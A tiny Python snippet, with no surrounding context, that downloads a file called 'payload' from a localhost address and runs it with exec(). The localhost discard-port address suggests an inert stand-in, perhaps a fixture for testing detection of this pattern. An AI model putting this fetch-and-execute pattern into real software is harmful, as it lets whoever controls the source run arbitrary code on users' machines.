import urllib.request

code = urllib.request.urlopen('http://127.0.0.1:9/payload').read()
exec(code)
